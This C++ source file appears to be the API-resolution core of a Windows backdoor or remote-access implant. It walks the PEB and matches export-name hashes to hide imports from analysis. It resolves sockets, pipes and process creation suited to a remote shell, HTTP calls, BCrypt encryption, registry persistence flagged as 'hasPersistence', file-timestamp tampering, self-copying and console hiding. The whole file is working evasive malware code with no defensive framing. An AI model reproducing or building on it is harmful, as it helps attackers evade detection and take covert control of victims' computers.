#include "Core/api_resolve.h"
#include <stdio.h>

extern "C" unsigned long long __readgsqword(unsigned long);


API_TABLE& GetAPI() {
    static API_TABLE instance = {0};
    return instance;
}

//get module by hash
PVOID GetModuleBaseByHash(QWORD targetHash) {
    PPEB peb = (PPEB)__readgsqword(0x60);

    PMY_PEB_LDR_DATA ldr = (PMY_PEB_LDR_DATA)peb->Ldr;

    PLIST_ENTRY moduleList = &ldr->InLoadOrderModuleList;
    PLIST_ENTRY pEntry = moduleList->Flink;

    while (pEntry != moduleList) {
        PMY_LDR_DATA_TABLE_ENTRY pModule = (PMY_LDR_DATA_TABLE_ENTRY)pEntry;

        if (pModule->BaseDllName.Buffer != NULL) {
            char dllName[256];
            size_t i = 0;

            while (pModule->BaseDllName.Buffer[i] != L'\0' && i < 255) {
                char c = (char)pModule->BaseDllName.Buffer[i];
                if (c >= 'a' && c <= 'z') c -= 32;
                dllName[i] = c;
                i++;
            }
            dllName[i] = '\0';

            if (HashString(dllName) == targetHash) {
                return pModule->DllBase;
            }
        }
        pEntry = pEntry->Flink;
    }
    return NULL;
}

PVOID GetProcAddressByHash(HMODULE hModule, QWORD targetHash) {

    if (!hModule) return NULL;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);

    // Export Directory
    IMAGE_DATA_DIRECTORY exportDataDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDataDir.VirtualAddress);

    DWORD* names = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* name = (const char*)((BYTE*)hModule + names[i]);
        if (HashString(name) == targetHash) {
            return (PVOID)((BYTE*)hModule + functions[ordinals[i]]);
        }
    }
    return NULL;
}

bool ResolveAPIs() {

    API_TABLE& API = GetAPI();

    HMODULE hKernel32 = (HMODULE)GetModuleBaseByHash(0X2E5140D020BA96B8);
    if (!hKernel32) return false;

    HMODULE hNtdll = (HMODULE)GetModuleBaseByHash(0X571A46A16587BB7A);
    if (!hNtdll) return false;

    // find LdrLoadDll
    _LdrLoadDll pLdrLoadDll = (_LdrLoadDll)GetProcAddressByHash(hNtdll, 0x4B09F24902A562FB);
    if (!pLdrLoadDll) return false;

    NTSTATUS status;

    //load Wininet (optional)
    wchar_t sWininet[] = { 'w','i','n','i','n','e','t','.','d','l','l','\0' };
    UNICODE_STRING usWininet;
    SET_UNICODE_STRING(usWininet, sWininet);
    HMODULE hWininet_module = NULL;
    pLdrLoadDll(NULL, NULL, &usWininet, (PVOID*)&hWininet_module);

    //load WS2_32
    wchar_t sWs2[] = { 'w','s','2','_','3','2','.','d','l','l','\0' };
    UNICODE_STRING usWs2;
    SET_UNICODE_STRING(usWs2, sWs2);
    HMODULE hWs2_module = NULL;
    status = pLdrLoadDll(NULL, NULL, &usWs2, (PVOID*)&hWs2_module);
    if (status != 0) return false;

    //load Advapi32.dll (optional)
    wchar_t sAdvapi32[] = { 'a','d','v','a','p','i','3','2','.','d','l','l','\0' };
    UNICODE_STRING usAdvapi32;
    SET_UNICODE_STRING(usAdvapi32, sAdvapi32);
    HMODULE hAdvapi32_module = NULL;
    pLdrLoadDll(NULL, NULL, &usAdvapi32, (PVOID*)&hAdvapi32_module);

    //load bcrypt.dll
    wchar_t sBcrypt[] = { 'b','c','r','y','p','t','.','d','l','l','\0' };
    UNICODE_STRING usBcrypt;
    SET_UNICODE_STRING(usBcrypt, sBcrypt);
    HMODULE hBcrypt_module = NULL;
    status = pLdrLoadDll(NULL, NULL, &usBcrypt, (PVOID*)&hBcrypt_module);
    if (status != 0) return false;

    // Resolve WinInet (optional)
    if (hWininet_module) {
        API.InternetOpenA        = (_InternetOpenA)       GetProcAddressByHash(hWininet_module, 0xFB7CDDB858CAFE2A);
        API.InternetConnectA     = (_InternetConnectA)    GetProcAddressByHash(hWininet_module, 0x276A4545FCB82C5D);
        API.HttpOpenRequestA     = (_HttpOpenRequestA)    GetProcAddressByHash(hWininet_module, 0xC8528A434A7395F4);
        API.HttpSendRequestA     = (_HttpSendRequestA)    GetProcAddressByHash(hWininet_module, 0x6B6CCA7A9BF35C59);
        API.InternetCloseHandle  = (_InternetCloseHandle) GetProcAddressByHash(hWininet_module, 0x288DEED800812A74);
    }

    // Resolve Winsock
    API.WSAStartup  = (_WSAStartup)  GetProcAddressByHash(hWs2_module, 0xDB9ABB924B9C9B2B);
    API.socket      = (_socket)      GetProcAddressByHash(hWs2_module, 0XA86F418C97C0BAE3);
    API.inet_addr   = (_inet_addr)   GetProcAddressByHash(hWs2_module, 0X44BB76F1DB05B999);
    API.htons       = (_htons)       GetProcAddressByHash(hWs2_module, 0x6411195B8164FF0F);
    API.connect     = (_connect)     GetProcAddressByHash(hWs2_module, 0X05994EEBE53FC71A);
    API.recv        = (_recv)        GetProcAddressByHash(hWs2_module, 0XEF604BEA3AAF662F);
    API.send        = (_send)        GetProcAddressByHash(hWs2_module, 0XD7CEE5287FC050FB);
    API.closesocket = (_closesocket) GetProcAddressByHash(hWs2_module, 0X329129F668619DDB);
    API.WSACleanup  = (_WSACleanup)  GetProcAddressByHash(hWs2_module, 0xF9B3C65AACC38437);
    API.setsockopt  = (_setsockopt)  GetProcAddressByHash(hWs2_module, 0x701F5C340AE6AEF0);
    API.WSAGetLastError = (_WSAGetLastError)    GetProcAddressByHash(hWs2_module, 0X26AC4BBEE140B696);
    API.ioctlsocket = (_ioctlsocket)            GetProcAddressByHash(hWs2_module, 0X001C2F8288C1471A);
    API.select      = (_select)                 GetProcAddressByHash(hWs2_module, 0XF6F1AB8E3ECEA97D);

    //Resolve Kernel32
    API.CreateProcessA = (_CreateProcessA)      GetProcAddressByHash(hKernel32, 0XD8A0828F172A5F1D);
    API.CreateProcessW = (_CreateProcessW)      GetProcAddressByHash(hKernel32, 0XEDA52151704F1F1D);
    API.CreatePipe = (_CreatePipe)              GetProcAddressByHash(hKernel32, 0xA10EFCED639EF820);
    API.ReadFile = (_ReadFile)                  GetProcAddressByHash(hKernel32, 0XFD251E616C8EEAED);
    API.CloseHandle = (_CloseHandle)            GetProcAddressByHash(hKernel32, 0XB42CAE24694DFC08);
    API.GetTickCount = (_GetTickCount)          GetProcAddressByHash(hKernel32, 0XC9D2245672F635F9);
    API.GetSystemInfo = (_GetSystemInfo)        GetProcAddressByHash(hKernel32, 0XA7DFDA2CF9DF8187);
    API.GlobalMemoryStatusEx = (_GlobalMemoryStatusEx)  GetProcAddressByHash(hKernel32, 0X1FDEF672EE63EEBE);
    API.SetHandleInformation = (_SetHandleInformation)  GetProcAddressByHash(hKernel32, 0XA7E5E47BC4092367);
    API.CreateFileA = (_CreateFileA)                    GetProcAddressByHash(hKernel32, 0XC3C4B8D0FDAA30B8);
    API.CreateFileW = (_CreateFileW)                    GetProcAddressByHash(hKernel32, 0X95A6173894D970B8);
    API.CopyFileW = (_CopyFileW)                        GetProcAddressByHash(hKernel32, 0X1C76FA59F5277941);
    API.SetFileAttributesW = (_SetFileAttributesW)      GetProcAddressByHash(hKernel32, 0XC76D7974869B0E5D);
    API.GetEnvironmentVariableW = (_GetEnvironmentVariableW)    GetProcAddressByHash(hKernel32, 0X77A192E845E29864);
    API.GetModuleFileNameW = (_GetModuleFileNameW)              GetProcAddressByHash(hKernel32, 0XE6260A60B527600B);
    API.GetSystemDirectoryW = (_GetSystemDirectoryW)            GetProcAddressByHash(hKernel32, 0X086A7D48FF1977F4);
    API.GetFileTime = (_GetFileTime)                            GetProcAddressByHash(hKernel32, 0X07BFC8239737DE45);
    API.SetFileTime = (_SetFileTime)                            GetProcAddressByHash(hKernel32, 0XCE940B71BF78D1AB);
    API.GetCommandLineW = (_GetCommandLineW)                    GetProcAddressByHash(hKernel32, 0X209159FC5DE94D17);
    API.SetErrorMode = (_SetErrorMode)                          GetProcAddressByHash(hKernel32, 0X97668A7FF15BCBA8);
    API.AddVectoredExceptionHandler = (_AddVectoredExceptionHandler)    GetProcAddressByHash(hKernel32, 0X8635EA5F6AB8C9EC);
    API.ExitProcess = ( _ExitProcess)                                   GetProcAddressByHash(hKernel32, 0X84D5616F4EBFB20F);
    API.CreateMutexW = (_CreateMutexW)                                  GetProcAddressByHash(hKernel32, 0X5512BB76497907BE);
    API.GetProcessHeap = (_GetProcessHeap)                              GetProcAddressByHash(hKernel32, 0XAA19B6D2D5279075);
    API.GetConsoleWindow = (_GetConsoleWindow)                          GetProcAddressByHash(hKernel32, 0xDA775FFC2043822E);

    // Load USER32 for ShowWindow
    wchar_t sUser32[] = { 'u','s','e','r','3','2','.','d','l','l','\0' };
    UNICODE_STRING usUser32;
    SET_UNICODE_STRING(usUser32, sUser32);
    HMODULE hUser32 = NULL;
    pLdrLoadDll(NULL, NULL, &usUser32, (PVOID*)&hUser32);
    if (hUser32) {
        API.ShowWindow = (_ShowWindow)GetProcAddressByHash(hUser32, 0xDBA3D4E049602CCA);
    }

    //Resolve Advapi32 (optional)
    if (hAdvapi32_module) {
        API.RegCreateKeyExW = (_RegCreateKeyExW)                    GetProcAddressByHash(hAdvapi32_module, 0XBF092A22B2A68E8D);
        API.RegSetValueExW = (_RegSetValueExW)                      GetProcAddressByHash(hAdvapi32_module, 0X8AB253EFF41BF1D6);
        API.RegCloseKey = (_RegCloseKey)                            GetProcAddressByHash(hAdvapi32_module, 0XBE984B99D4AD59E8);
        API.LookupAccountSidW= (_LookupAccountSidW)                 GetProcAddressByHash(hAdvapi32_module, 0xF4B46442EEA466E9);
    }
    

    //Resolve Bcrypt
    API.BCryptOpenAlgorithmProvider = (_BCryptOpenAlgorithmProvider)    GetProcAddressByHash(hBcrypt_module, 0XA22404930E927C50);
    API.BCryptCloseAlgorithmProvider = (_BCryptCloseAlgorithmProvider)  GetProcAddressByHash(hBcrypt_module, 0xCA708204DFFBF626);
    API.BCryptGenRandom = (_BCryptGenRandom)                            GetProcAddressByHash(hBcrypt_module, 0X6340B97D4D344744);
    API.BCryptImportKeyPair = (_BCryptImportKeyPair)                    GetProcAddressByHash(hBcrypt_module, 0X008A05D1C4E3CE12);
    API.BCryptGenerateSymmetricKey = (_BCryptGenerateSymmetricKey)      GetProcAddressByHash(hBcrypt_module, 0X3610C45F894A02CC);
    API.BCryptEncrypt = (_BCryptEncrypt)                                GetProcAddressByHash(hBcrypt_module, 0XD341D332DE9B5FEA);
    API.BCryptDecrypt = (_BCryptDecrypt)                                GetProcAddressByHash(hBcrypt_module, 0XE0C6329330D2028D);
    API.BCryptDestroyKey = (_BCryptDestroyKey)                          GetProcAddressByHash(hBcrypt_module, 0X0C0EF32FAFE75D14);
    API.BCryptSetProperty = (_BCryptSetProperty)                        GetProcAddressByHash(hBcrypt_module, 0X60F7A50C4EF9405F);
    API.BCryptGetProperty = (_BCryptGetProperty)                        GetProcAddressByHash(hBcrypt_module, 0XBAB74E3F63219C2D);


    //Resolve ntdll 
    API.RtlAllocateHeap = (_RtlAllocateHeap)                    GetProcAddressByHash(hNtdll, 0X2604DFC2F49C094C); 
    API.RtlFreeHeap = (_RtlFreeHeap)                            GetProcAddressByHash(hNtdll, 0XB62DA68CB067F11B);


    // Capability flags for optional subsystems
    API.hasWinInet = hWininet_module && API.InternetOpenA && API.InternetConnectA
            && API.HttpOpenRequestA && API.HttpSendRequestA && API.InternetCloseHandle;

    API.hasPersistence = hAdvapi32_module && API.RegCreateKeyExW && API.RegSetValueExW
            && API.RegCloseKey && API.LookupAccountSidW;

    // Critical: Winsock
    if (!API.WSAStartup || !API.socket || !API.inet_addr || !API.htons || !API.connect
            || !API.recv || !API.send || !API.closesocket || !API.WSACleanup || !API.setsockopt
            || !API.WSAGetLastError)
        return false;

    // Critical: Kernel32
    if (!API.CreateProcessA || !API.CreateProcessW || !API.CreatePipe || !API.ReadFile
            || !API.CloseHandle || !API.GetTickCount || !API.GetSystemInfo || !API.GlobalMemoryStatusEx
            || !API.SetHandleInformation || !API.CreateFileA || !API.CreateFileW || !API.CopyFileW
            || !API.SetFileAttributesW || !API.GetEnvironmentVariableW || !API.GetModuleFileNameW
            || !API.GetSystemDirectoryW || !API.GetFileTime || !API.SetFileTime || !API.GetCommandLineW
            || !API.SetErrorMode || !API.AddVectoredExceptionHandler || !API.ExitProcess
            || !API.CreateMutexW || !API.GetProcessHeap)
        return false;

    // Critical: BCrypt
    if (!API.BCryptOpenAlgorithmProvider || !API.BCryptCloseAlgorithmProvider || !API.BCryptGenRandom
            || !API.BCryptImportKeyPair || !API.BCryptGenerateSymmetricKey || !API.BCryptEncrypt
            || !API.BCryptDecrypt || !API.BCryptDestroyKey || !API.BCryptSetProperty || !API.BCryptGetProperty)
        return false;

    // Critical: ntdll heap
    if (!API.RtlAllocateHeap || !API.RtlFreeHeap) return false;

    return true;
}
